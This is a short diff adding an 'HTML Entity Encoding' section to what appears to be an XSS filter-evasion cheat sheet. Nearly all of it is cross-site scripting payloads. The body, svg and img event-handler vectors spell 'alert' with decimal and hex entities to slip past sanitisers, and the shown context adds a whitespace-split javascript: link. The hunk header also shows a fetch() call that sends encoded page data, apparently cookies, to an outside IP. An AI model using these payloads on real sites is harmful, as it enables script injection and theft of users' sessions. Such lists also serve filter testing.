@@ -19,3 +19,18 @@ Base64 encoded payload: fetch('http://10.201.82.177:8000/'+encodeURIComponent(do
 ### 4) White Space and Delimiters
 
     <a/href=j&#x0D;avascript:a&#x0D;lert(1)>aaa</a>
+
+### 5) HTML Entity Encoding
+
+Full Decimal Encoding
+
+    <body onload=&#97;&#108;&#101;&#114;&#116;(1)>
+
+Hex encoding for 'alert'
+
+    <svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
+
+Decimal encoding for 'a'
+
+    <img src=x onerror=&#97;lert(1)>
+
